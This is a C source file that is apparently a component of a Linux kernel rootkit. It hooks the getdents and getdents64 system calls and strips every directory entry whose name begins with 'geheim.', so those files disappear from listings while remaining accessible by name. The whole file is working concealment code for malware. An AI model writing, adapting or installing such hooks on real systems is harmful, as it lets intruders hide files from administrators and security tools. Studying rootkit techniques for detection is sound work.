/**
 * hide_file.c
 *
 * These files are still accessible with open/read etc. if the filename is known.
 */
#include <linux/kallsyms.h>
#include <asm/cacheflush.h>
#include <asm/special_insns.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <asm/paravirt.h> /* write_cr0 */
#include "hook.h"
#include "function_hooking.h"

/************** Defines **************/
#define PREFIX_TO_HIDE	"geheim."
#define LENGTH_PREFIX	sizeof(PREFIX_TO_HIDE) - 1
struct linux_dirent {
	u64 d_ino;
	s64 d_off;
	unsigned short d_reclen;
	char d_name[];
} linux_dirent;
typedef asmlinkage int (*dents_func)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
typedef asmlinkage int (*dents_func64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

/************ Prototypes *****************/
asmlinkage int own_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage int own_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

/************* Local data ********/
/* Syscall table -> exported to function_hooking */
//static void **syscall_table_pu64;
/* To save the original dents function syscalls */
dents_func orig_dents;
dents_func64 orig_dents64;
function_hook_t *dents, *dents64;

/************ Implementation *******/

void initialize_hiding_files(void) {

	dents = add_syscall_to_hook(own_getdents, __NR_getdents);
	dents64 = add_syscall_to_hook(own_getdents64, __NR_getdents64);
}

void remove_hiding_files(void) {
	return;
}

/**
 * Modified getdents function, which doesn't return files with some prefixes.
 */
asmlinkage int own_getdents(unsigned int fd, struct linux_dirent __user *dirp,
		unsigned int count) {
	int nread;
	int counter;
	char* byte_pointer;
	struct linux_dirent* current_dirent;
	dents_func orig_func;

	inc_use_count(dents);

	/* call the original syscall */
	orig_func = (dents_func)dents->original_function;
	nread = orig_func(fd, dirp, count);

	/* if there was an error pass it to the caller */
	if(nread < 0) {
		dec_use_count(dents);
		return nread;
	}

	/* set byte pointer onto the first memory address */
	byte_pointer = (char *)dirp;

	/* go through all returned values and remove the names */
	for(counter = 0; counter < nread;) {
		current_dirent = (struct linux_dirent *)(byte_pointer+counter);
		unsigned short length_this_struct = current_dirent->d_reclen;
		if(strncmp(current_dirent->d_name, PREFIX_TO_HIDE, LENGTH_PREFIX) == 0) {
			/* copy the entries in return backwards */
			memcpy(current_dirent, byte_pointer+counter+ length_this_struct,
					nread - counter - length_this_struct);

			/* adapt length of new field */
			nread = nread - length_this_struct;
		}
		else {
			/* Add length of this dirent struct */
			counter += length_this_struct;
		}
	}
	dec_use_count(dents);
	return nread;
}

/**
 * Modified getdents function, which doesn't return files with some prefixes.
 */
asmlinkage int own_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp,
		unsigned int count) {

	int nread;
	int counter;
	char* byte_pointer;
	struct linux_dirent64* current_dirent;
	dents_func64 orig_func;

	inc_use_count(dents64);

	/* call the original syscall */
	orig_func = (dents_func64)dents64->original_function;
	nread = orig_func(fd, dirp, count);

	/* if there was an error pass it to the caller */
	if(nread < 0) {
		dec_use_count(dents64);
		return nread;
	}

	/* set byte pointer onto the first memory address */
	byte_pointer = (char *)dirp;

	/* go through all returned values and remove the names */
	for(counter = 0; counter < nread;) {
		current_dirent = (struct linux_dirent64 *)(byte_pointer+counter);
		int length_this_struct = current_dirent->d_reclen;
		if(strncmp(current_dirent->d_name, PREFIX_TO_HIDE, LENGTH_PREFIX) == 0) {
			/* copy the entries in return backwards */
			memcpy(current_dirent, byte_pointer+counter+ length_this_struct,
					nread - counter - length_this_struct);

			/* adapt length of new field */
			nread = nread - length_this_struct;
		}
		else {
			/* Add length of this dirent struct */
			counter += length_this_struct;
		}
	}
	dec_use_count(dents64);
	return nread;
}
